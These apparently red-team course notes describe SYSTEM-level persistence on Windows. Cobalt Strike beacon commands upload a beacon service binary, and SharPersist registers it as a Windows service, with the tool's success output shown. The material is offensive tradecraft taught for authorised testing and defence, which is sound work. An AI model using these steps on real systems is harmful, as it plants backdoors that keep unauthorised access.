# Elevated SYSTEM Persistence

## Introduction

In Windows, the SYSTEM user is often restricted from interacting with web proxies fora combination of security & operational reasons. When maintaining SYSTEM persistence, we'll have to use P2P or DNS for communication.

## Windows Services

We can use SharPersist & Cobalt Strike to create & upload a new service and beacon payload.

#### Upload Payload

```
beacon> cd C:\Windows
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> mv tcp-local_x64.svc.exe persistent-svc.exe
```

#### Maintain Persistence - SharPersist

```
beacon> execute-assembly C:\Tools\SharPersist.exe -t service -c "C:\Windows\persistent-svc.exe" -n "persistent-svc" -m add

[*] INFO: Adding service persistence
[*] INFO: Command: C:\Windows\persistent-svc.exe
[*] INFO: Command Args: 
[*] INFO: Service Name: persistent-svc

[+] SUCCESS: Service persistence added
```
